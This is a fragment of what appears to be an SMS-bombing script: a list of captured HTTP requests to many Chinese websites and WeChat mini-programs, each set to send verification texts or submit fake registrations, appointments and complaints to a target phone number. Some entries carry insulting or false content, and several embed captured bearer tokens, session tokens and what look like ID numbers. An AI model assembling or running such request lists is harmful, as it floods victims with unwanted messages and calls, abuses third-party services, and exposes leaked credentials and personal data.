    "data": "chn=mlxm-gzh-jbpyl-xxsj-zhengweiqiang-1v1zx-h5-xys-01-cp-008&eva=2023000830&name=%E6%95%91%E8%B5%8E&mobile={phone}&cbs=&biztype=&act_name=cal_insure_no_verify&outer_act_link=https%3A%2F%2Fwww.xiaoyusan.com%2Fshk%2Fwkpage%2Findex%2F38376d_2023000830.1.html%3Feva%3D2023000830%26chn%3Dmlxm-gzh-jbpyl-xxsj-zhengweiqiang-1v1zx-h5-xys-01-cp-008%26wkpushstate%3D1754377971445&remark=%E4%B8%BA%E8%B0%81%E5%AE%9A%E5%88%B6%EF%BC%9A%E8%87%AA%E5%B7%B1%2C%E8%B4%AD%E4%B9%B0%E9%99%A9%E7%A7%8D%EF%BC%9A%E9%87%8D%E7%96%BE%E9%99%A9",
    "headers": {
      "Host": "www.xiaoyusan.com",
      "Connection": "keep-alive",
      "sec-ch-ua-platform": "\"Android\"",
      "X-Requested-Sh-Traceid": "936e759279edc705dfdf4c3dab890cec",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
      "sec-ch-ua-mobile": "?1",
      "X-Requested-With": "XMLHttpRequest",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/x-www-form-urlencoded",
      "Origin": "https://www.xiaoyusan.com",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://www.xiaoyusan.com/shk/wkpage/index/38376d_2023000830.1.html?eva=2023000830&chn=mlxm-gzh-jbpyl-xxsj-zhengweiqiang-1v1zx-h5-xys-01-cp-008&wkpushstate=1754377971445",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
  },
  {
    "name": "cn.mikecrm.com",
    "url": "http://cn.mikecrm.com/handler/web/form_runtime/handleSubmit.php",
    "method": "POST",
    "data": "d=" + quote(json.dumps({
      "cvs": {
        "i": 631193,
        "t": "ozURs1",
        "s": 378999,
        "acc": "orWXs2vrRcVP9pfzZH1ppaL2uMsKvJZR",
        "r": "",
        "c": {
          "cp": {
            "733857": "救赎抓包666",
            "733858": {"n": "救赎"},
            "733859": "国安",
            "733860": [base64.b64encode(phone.encode('utf-8')).decode('utf-8')],
            "733861": "50",
            "733862": [616686, 616685, 616684, 616683, 616682]
          },
          "ext": {"uvd": [733857, 733858, 733859, 733860]}
        }
      }
    })),
    "headers": {
      "Host": "cn.mikecrm.com",
      "Connection": "keep-alive",
      "X-Requested-With": "XMLHttpRequest",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
      "Accept": "application/json, text/javascript, */*; q=0.01",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "Origin": "http://cn.mikecrm.com",
      "Referer": "http://cn.mikecrm.com/ozURs1",
      "Accept-Encoding": "gzip, deflate",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
  },
  {
    "name": "msg.szjhjt.com",
    "url": "https://msg.szjhjt.com/main/msg/leave",
    "method": "POST",
    "json_data": {
      "name": "救赎",
      "phoneText": f"{phone}",
      "type": "ali",
      "appid": "wx3b723cd4634f5ef2",
      "news_text": "拖欠工资",
      "select_as_name": "1千-1万",
      "text_content": "黑心老板张总，拖欠我3万工资"
    },
    "headers": {
      "Host": "msg.szjhjt.com",
      "Connection": "keep-alive",
      "token": "",
      "content-type": "application/json",
      "charset": "utf-8",
      "Referer": "https://servicewechat.com/wx3b723cd4634f5ef2/2/page-frame.html",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
      "Accept-Encoding": "gzip, deflate, br"
    }
  },
  {
    "name": "qixin18.com",
    "url": "https://cps.qixin18.com/v3/m/api/common/sendReservatSmsCode",
    "method": "POST",
    "params": {
      "md": "0.4350888810127329"
    },
    "json_data": {
      "telephone": f"{phone}",
      "nvcData": "%7B%22a%22%3A%22FFFF000000000176F978%22%2C%22c%22%3A%221754393074418%3A0.11043106819183113%22%2C%22d%22%3A%22nvc_message_h5%22%2C%22h%22%3A%7B%22key1%22%3A%22code0%22%2C%22nvcCode%22%3A400%2C%22umidToken%22%3A%22T2gAS31uagM2X-E0z2j2JuoQ9YfSR0ti-jqcPAZIthsx8iZBAl1Z7vDTZfx5_2e30Ok%3D%22%7D%2C%22j%22%3A%7B%22test%22%3A1%7D%2C%22b%22%3A%22140%23j5ToaOeezzPXyQo2FxBQA3SoYtkr1PCOldd96z9Jk1L06PJD5Csanhp61jGBhxAOoVmS%2FihPGjWXxp1L25stjOCDyzldmtrj7u2yz%2BDQzPgflp1zzXE62m9NBQzxOmHK9pJjzzrb22U3l61x0b2IV2VjUQDa2DcR0uG8zbzeP183l6TzDDrbnxEl6gfa2Pc3Vtg2zFzB2ws9lUWLz8riE2h%2F8brzHs83K3JjzFzb2LDZlQ5xOPFbciCqlQzz2nH%2BV31QFQzXHO83l6TzH8rb8Og%2FxF%2Bx2PD3VtCfzxfS2dAWl3MzzDxiVOGl3lbzzyc4Vpg%2FzdrI2osYPfSzMrMiV2E%2FlMTx2Pp%2BN3lqoF%2B4211WlplJzPKvV2TcxQ4d2P4JhoMTzTbi2U5pl4Qo5fzI2z6HkHmijDapVrMn%2F2I4jearIkM%2BIXKnqdqAtmQLHluyyuI%2FLigLnFwu90YKzhKsb4MDX2%2Fj3fxaTvyx2GBaAp5hxz5FTZvsc5b9yd3BvpPfvycy8%2BU8kSOYW1Pu0POhXQZtYobTZuDZ6%2FhIWU2ok8qzwNyRoBa7J0%2F5uBUFxw5aUEzMw%2FHintdyKouRJHkIIDm9e6uDyY6hgi%2BmDMY%2BDxS03%2F6TRMqlrLnIKxrYLShpPGwIbvhA7bssFKsXax2qHT8RFT8QieM55h3b5be%2FYoEHt0XcJzgvBtq5JGRo8DD1lUjpOlxOkZU3N78niCXLo8VlzZaxVXRCuOcKqiNLCMG%2F5sd9MOt3ChJC36pNbGoKkxCGNduPxPqZXFyHJSfsebfJICy%2BbT1xqiIJacOtbd4%2FWF6o2JgslXqz3Dc3Kp1zilUb2d2ZioK5KDnJP5bHcLtXNxRVR%2BrR4Msg8v82no70sAg2O3qjfuqW3LFamluYz47%2BjwWU82KW5ucAUQtcsIm436iZ3%2F1%2B4Xc%2FvBJ3ngE3%2FtH6SWNjM5k4wKuYLhCgUgmqDB1z3LUcVMDwNYGD0zDSZrdyVY3jraUa4X4A2hbU0dVLcQm2LCy9OuQtFpV9S0wu6pSgtx8JN41%3D%22%2C%22e%22%3A%22cbFWvt9kexwpfxCybnUZIeRXz45AI-bGe58D_qNbcmaHrS9W8frU1RtVpWNk_x6OKmDiaOmCDj54dYR_DJ9RspqEIDdNHNK5HUMU627XqqmfOR8E5TFJv32bOkU5rsK0uL94kY14W-TIhbX0kuKFAPh88DLPh6d509g_3Yca4XtnK9A4GT4Z9fixZrARvDomK9ichTMCJ4brC9lV3KiLNhZwuR_Njcgb3lv1fLasHEj3mIXbaXIS8qXt8wPlkyGQqBQtPXt9KBZtGtiogryxFUug5sRl8IKnUhzHY1aq4lbgL_dJz7qe5eBpCK0VEI0X0TZk9CYUEg01YTuvCMKFMuIknevhmPdD8bHW918-lSpCiNImoKrKVCuZjzOta_aLZ6AvmqZYXV2p-2jwyK3k5-MAVa2XVLqq6mUb2LMtaCGzFnEPsho4Dj5ALMo32aVsOoLGymA9GsWPL4xkgVjHZ-Ll5Zvf59cs6ikTIPkaRQ0%22%2C%22i%22%3Atrue%7D"
    },
    "headers": {
      "Host": "cps.qixin18.com",
      "Connection": "keep-alive",
      "traceparent": "00-ec6e919fb633d89b0cfe89478947868c-600925b4aada7870-01",
      "sec-ch-ua-platform": "\"Android\"",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
      "Accept": "application/json, text/plain, */*",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
      "Content-Type": "application/json;charset=UTF-8",
      "sec-ch-ua-mobile": "?1",
      "Origin": "https://cps.qixin18.com",
      "X-Requested-With": "com.tencent.mm",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://cps.qixin18.com/m/apps/cps/bxn1096837/api/common/sendReservatSmsCode?md=0.4350888810127329",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
  },
  {
    "name": "checkreport.taikanglife.com",
    "url": "https://checkreport.taikanglife.com/contact-xyw/clue/clueNotifyTikTalk",
    "method": "POST",
    "json_data": {
      "name": "救赎",
      "phone": f"{phone}",
      "yq": "哈尔滨龙园",
      "source": "集团官网移动端",
      "createTime": "2025-08-05 19:54:02",
      "ageType": "N",
      "yzcode": ""
    },
    "headers": {
      "Host": "checkreport.taikanglife.com",
      "Connection": "keep-alive",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/json;charset=UTF-8",
      "Origin": "http://checkreport.taikanglife.com",
      "X-Requested-With": "com.tencent.mm",
      "Referer": "http://checkreport.taikanglife.com/o2oweb/?entrance=%E9%9B%86%E5%9B%A2%E5%AE%98%E7%BD%91%E7%A7%BB%E5%8A%A8%E7%AB%AF",
      "Accept-Encoding": "gzip, deflate",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
  },
  {
    "name": "h5-api.lynkco.com",
    "url": "https://h5-api.lynkco.com/wx-miniprogram/miniProgramDriveRecord/addReserveRecord",
    "method": "POST",
    "json_data": {
      "date": "2025-08-06T12:30:30.597Z",
      "dealerCode": "101556",
      "mobile": f"{phone}",
      "seriesCode": "414"
    },
    "headers": {
      "Host": "h5-api.lynkco.com",
      "Connection": "keep-alive",
      "content-type": "application/json",
      "token": "5b8a7132-c501-4df0-8397-1b2a9bf44718",
      "X-Ca-Key": "204644386",
      "X-Ca-Nonce": "3e4e74b0-d6e1-47c2-b92f-6627b86edf4f",
      "X-Ca-Signature-Method": "HmacSHA256",
      "X-Ca-Timestamp": "1754397030598",
      "X-Ca-Signature-Headers": "X-Ca-Key,X-Ca-Timestamp,X-Ca-Nonce,X-Ca-Signature-Method",
      "X-Ca-Signature": "D3+hObHeiPnbzUIAh2w05av8QxYadV44SvXWjx4NFK8=",
      "Accept": "*/*",
      "charset": "utf-8",
      "Referer": "https://servicewechat.com/wx4e8c1172fe132106/164/page-frame.html",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
      "Accept-Encoding": "gzip, deflate, br"
    }
  },
  {
    "name": "api.wfjec.com",
    "url": "https://api.wfjec.com/mall/user/sendRegisterSms",
    "method": "PUT",
    "json_data": {
      "mobile": f"{phone}"
    },
    "headers": {
      "Host": "api.wfjec.com",
      "Connection": "keep-alive",
      "locale": "zh_CN",
      "content-type": "application/json;charset=utf-8",
      "wuhash": "oyimt5A-pyJtv3m3psCe__6MbhIs",
      "appid": "wxf9cbb6c11bdbef46",
      "charset": "utf-8",
      "Referer": "https://servicewechat.com/wxf9cbb6c11bdbef46/155/page-frame.html",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
      "Accept-Encoding": "gzip, deflate, br"
    }
  },
  {
    "name": "passport.csdn.net",
    "url": "https://passport.csdn.net/v1/login/wap/sendWAPVerifyCode",
    "method": "POST",
    "json_data": {
      "mobile": f"{phone}",
      "code": "0086",
      "type": "0"
    },
    "headers": {
      "Host": "passport.csdn.net",
      "Connection": "keep-alive",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
      "X-Tingyun-Id": "im-pGljNfnc;r=396955646",
      "sec-ch-ua-mobile": "?1",
      "X-Requested-With": "XMLHttpRequest",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/json;charset=UTF-8",
      "Origin": "https://passport.csdn.net",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://passport.csdn.net/signwap",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
  },
  {
    "name": "qixin18.com",
    "url": "https://cps.qixin18.com/m/apps/cps/bxn1096837/api/mobile/sendSmsCode",
    "method": "POST",
    "params": {
      "md": "0.8036556356856903"
    },
    "json_data": {
      "cardNumber": "NDIyNDIzMTk3NTA3MjQ2NjE1",
      "mobile": f"{encrypt_phone(phone)}",
      "cardTypeId": "1",
      "cname": "救赎",
      "productId": 105040,
      "merchantId": 1096837,
      "customerId": 37640245,
      "encryptInsureNum": "cm98HrGWSRoJRojI5Tg6Bg"
    },
    "headers": {
      "Host": "cps.qixin18.com",
      "Connection": "keep-alive",
      "traceparent": "00-d5056a43b015f07aded289325bbf2233-cfe0be18fc00d80a-01",
      "sec-ch-ua-platform": "\"Android\"",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003D57) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64",
      "Accept": "application/json, text/plain, */*",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
      "Content-Type": "application/json;charset=UTF-8",
      "sec-ch-ua-mobile": "?1",
      "Origin": "https://cps.qixin18.com",
      "X-Requested-With": "com.tencent.mm",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://cps.qixin18.com/m/apps/cps/bxn1096837/product/insure?encryptInsureNum=cm98HrGWSRoJRojI5Tg6Bg&isFormDetail=1&merak_traceId=0cb083327198781a0a49L9pe4DfciD61",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
  },
  {
    "name": "law.q1s.cn",
    "url": "https://law.q1s.cn/api/common/sendSms",
    "method": "POST",
    "json_data": {
      "type": "submit",
      "mobile": f"{phone}"
    },
    "headers": {
      "Host": "law.q1s.cn",
      "Connection": "keep-alive",
      "content-type": "application/json",
      "Authorization": "Bearer 1277120|WhPbSTqvm9o4rlDdR6VdykrC17jrbVKCgl4rH84uc7a88391",
      "Version": "5",
      "charset": "utf-8",
      "Referer": "https://servicewechat.com/wx000a21741b87cbdb/7/page-frame.html",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
      "Accept-Encoding": "gzip, deflate, br"
    }
  },
  {
    "name": "mobilev2.atomychina.com.cn",
    "url": "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code",
    "method": "POST",
    "json_data": {
      "mobile": f"{phone}",
      "captcha": "1111",
      "token": "1111",
      "prefix": 86
    },
    "headers": {
      "Host": "mobilev2.atomychina.com.cn",
      "Connection": "keep-alive",
      "pragma": "no-cache",
      "cache-control": "no-cache",
      "Accept": "application/json",
      "x-requested-with": "XMLHttpRequest",
      "design-site-locale": "zh-CN",
      "Accept-Language": "zh-CN",
      "X-HTTP-REQUEST-DOMAIN": "mobilev2.atomychina.com.cn",
      "content-type": "application/json",
      "charset": "utf-8",
      "Referer": "https://servicewechat.com/wx74d705d9fabf5b77/171/page-frame.html",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
      "Accept-Encoding": "gzip, deflate, br"
    }
  },
  {
    "name": "lnjsb.chyhis.cn",
    "url": "https://lnjsb.chyhis.cn:9106/api/SMS/SendSMS",
    "method": "POST",
    "json_data": {
      "delKeys": None,
      "detailData": None,
      "mainData": {
        "mobile": f"{phone}",
        "tempId": "OYI2w2",
        "type": "chengyu"
      }
    },
    "headers": {
      "Host": "lnjsb.chyhis.cn:9106",
      "Connection": "keep-alive",
      "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiI0MDg4MyIsImlhdCI6IjE3NTQzOTc2NjYiLCJuYmYiOiIxNzU0Mzk3NjY2IiwiZXhwIjoiMTc2MTU5NzY2NiIsImlzcyI6IlZvbFByby5jb3JlLm93bmVyIiwiYXVkIjoidm9sLmNvcmUifQ.0WrnBuM3orSvxgT3oFo4p0o3vt3-WeVF8xm1eCuo6dY",
      "lang": "zh_CN",
      "sid": "f95c348d-c9bf-4d50-83ee-32d5111aa5e5",
      "content-type": "application/json",
      "charset": "utf-8",
      "Referer": "https://servicewechat.com/wx7131dd0ea8151e2b/3/page-frame.html",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
      "Accept-Encoding": "gzip, deflate, br"
    }
  },
  {
    "name": "wx.hy021.net",
    "url": "https://wx.hy021.net/api/mb1001/guahao",
    "method": "POST",
    "json_data": {
      "data": {
        "type": 2,
        "name": "救赎",
        "age": "35",
        "phone": f"{phone}",
        "detail": "脑子不正常好像是脑残了",
        "gender": "男",
        "sex": 1,
        "doctor": "牛玉权"
      },
      "appid": "1282a884-bde3-11ef-801e-b8cef617a30e"
    },
    "headers": {
      "Host": "wx.hy021.net",
      "Connection": "keep-alive",
      "appid": "1282a884-bde3-11ef-801e-b8cef617a30e",
      "content-type": "application/json",
      "charset": "utf-8",
      "Referer": "https://servicewechat.com/wx7ac8f33f519ebaa2/1/page-frame.html",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
      "Accept-Encoding": "gzip, deflate, br"
    }
  },
{
    "name": "i.yunyiyuan.com",
    "url": "https://i.yunyiyuan.com/consultsearch/api/realName/realNameIdentify",
    "method": "POST",
    "params": {
      "_sid": "113431987lv62"
    },
    "json_data": {
      "entryType": "MY",
      "loginPersonId": "acc_2f7b22144a5c48038e04bdb5af0f1dec",
      "personId": "acc_2f7b22144a5c48038e04bdb5af0f1dec",
      "personName": "救赎",
      "proofType": "01",
      "proofName": None,
      "proofNum": "321323198602205111",
      "maskProofNum": "321323198602205111",
      "phoneNum": None,
      "maskPhoneNum": None,
      "mobileNum": "3DE6EBFE9D7EE8DC3BF4A004B9AE8EBE",
      "maskMobileNum": "18888888888",
      "genderCode": "1",
      "genderName": "男",
      "birthday": "1986-02-20",
      "headImg": None,
      "isChild": False,
      "realNameIdentify": "0",
      "nationalityCode": None,
      "nationalityName": "",
      "guardianName": None,
      "guardianProofType": None,
      "guardianProofNum": None,
      "maskGuardianProofNum": None,
      "guardianMobileNum": None,
      "guardianBirthday": None,
      "guardianGenderCode": None,
      "guardianGenderName": None,
      "guardianNationalityCode": None,
      "guardianNationalityName": None,
      "sendMobileNum": "3DE6EBFE9D7EE8DC3BF4A004B9AE8EBE",
      "headImgType": "",
      "faceType": None,
      "carrierAbbr": "NBSJSBY",
      "scopeCode": "XK33020501EBBDECID",
      "xkOrgCode": "XK33020501EBBDECID"
    },
    "headers": {
      "Host": "i.yunyiyuan.com",
      "Connection": "keep-alive",
      "dcd": "",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
      "sec-ch-ua-mobile": "?1",
      "tt": "WX_OFFICIAL",
      "tc": "NBSJSBY",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/json; charset=UTF-8",
      "Origin": "https://i.yunyiyuan.com",
      "X-Requested-With": "com.tencent.mm",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://i.yunyiyuan.com/consult_search_frontend/commonHome.html?authorizeCode=DB712A23506A6699A2128CCA5825EB0511F26CBCA594E7CBB676FC835778AA383C2F67E935375616A7C286AD3FD085451D929FD052183C16C5570C1A1544A8FA162EEFDE8A85F9F6832BFAEFB6C002CAF47CD77E33ADE2494F25E0B1839D4E71BA3D50FF5F15CAD86CD8E006764B6EF255A328CE4B39F12E46E200275AFF373C0B14F890BBDFA10AF93E6ECF29C7A975D073791BAB1A371C3C7C6C736E26BBB095460C92E4D9A32CC518714C8662A036360989765B4E4AFF6F6C9ED57016A6BA0B5D3EF603829D9BB2F50BEDEFCE82FBB6BCC05FF60CACF132FED5B9B98C868F21F7057EA2A3F6529495350AB68A54FDAFA0F2EECD84B73569436AC2A08538302A590C6FD48A21F1AF9D14583C21447F7607C861A61AA66481DF04B6F76EA4E437E400751F150A82748047943690CD1C832A349C0E6166A81BD6EE0CFC4BAF0035459F1F80719ED803C9C08D683C1C2386E34B4BBFFA3DEC3A86CF0BD537870B03088A8A5AF82DB4C6B38B15E11ED5CAA1BA87FB60D51C6554A4279F0D869C0FE5F900492368142CB330D5B5A513903D&terminalCode=NBSJSBY",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
  },
  {
    "name": "2032680.ixiaochengxu.cc",
    "url": "https://2032680.ixiaochengxu.cc/index.php",
    "method": "GET",
    "params": {
      "s": "/addon/DuoguanZiXun/Api/toSaveReserve.html",
      "username": "%E6%95%91%E8%B5%8E",
      "phone": f"{phone}",
      "serverinfo": "%E6%97%A0%E6%95%88%E9%9C%80%E8%A6%81%E8%BF%99%E4%BA%9B",
      "datetime": "2025-08-05 21:04",
      "wid": 30915,
      "is_wx": "false",
      "utoken": "79d556aea8507c28bcd11ea280217960",
      "token": "gh_f4f80271a70f"
    },
    "headers": {
      "Host": "2032680.ixiaochengxu.cc",
      "Connection": "keep-alive",
      "content-type": "application/x-www-form-urlencoded",
      "client": "XCX",
      "charset": "utf-8",
      "Referer": "https://servicewechat.com/wxfdc41457dd795df2/1/page-frame.html",
      "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
      "Accept-Encoding": "gzip, deflate, br"
    }
  },
{
    "name": "blue.planplus.cn",
    "url": "https://blue.planplus.cn/account/api/account/v1/member/sms/sendCode",
    "method": "POST",
    "params": {
        "mobile": phone  # 直接使用变量，不需要引号
    },
    "headers": {
        "Host": "blue.planplus.cn",
        "Connection": "keep-alive",
        "x-user-token": "TrpusLsAnnNeyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3NTQ1Mjk3NzAsInRva2VuIjoie1wiZnJvbVwiOlwicGxhdGZvcm1cIixcIm9wZW5pZFwiOlwib3lLN3UwQXJMVGYybjRNR2oyc0tJYVBTX0hKd1wiLFwidW5pb25pZFwiOlwib0hlQ2NzLUFwSU05N1V2anc1a3prY1E1T3N0b1wifSJ9.o1o4upLSYY2tuiNcrJIG2r-F4DoUcw6YOana759BhzLPLmpRFXDrHKOvNPBDhijD1GKvu7vnc1MyL4BHk0iEhA",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wxd4c6c416bdab4315/51/page-frame.html",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip, deflate, br"
    }
},
{
  "name": "wlhy.jc56.net",
  "url": "https://wlhy.jc56.net/lotms/mobile/carrier/sendSmsCode",
  "method": "GET",
  "params": {
    "mobile_phone": f"{phone}",
    "flag": "register"
  },
  "headers": {
    "content-type": "application/json;charset=UTF-8",
    "token": "",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wxea70042f06359f0e/65/page-frame.html"
  }
},
{
  "name": "gw.shiqiao.com",
  "url": "https://gw.shiqiao.com/__/gateway/common-authorization-provider/user/sysUsr/v2/getSmsCaptcha",
  "method": "POST",
  "json_data": {
    "usrNm": f"{phone}",
    "loginType": "2",
    "sysCd": 50002
  },
  "headers": {
    "Content-Type": "application/json",
    "platform": "android",
    "version": "5.8.2",
    "deviceId": "sbid100",
    "model": "OPD2404",
    "target": "SQHZD",
    "userId": "",
    "token": "NzNiODM1MGRiZDE5NDY3NWFlNTE2OTc3OTAwMmJlYTg",
    "timestamp": "1759151982648",
    "frontCode": "50002002",
    "loginVersion": "5.8.2",
    "customerId": "",
    "sysCd": "50002",
